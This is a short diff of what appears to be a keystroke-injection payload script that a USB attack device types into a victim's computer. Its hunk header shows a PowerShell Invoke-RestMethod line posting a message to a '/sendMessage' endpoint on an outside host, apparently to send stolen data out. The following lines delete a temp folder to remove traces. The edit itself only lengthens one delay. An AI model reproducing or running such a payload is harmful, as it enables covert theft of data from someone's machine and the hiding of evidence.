@@ -44,7 +44,7 @@ STRING Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($Messag
 ENTER
 DELAY 500
 STRING cd ..
-DELAY 250
+DELAY 500
 STRING rm -r temp
 DELAY 500
 ENTER
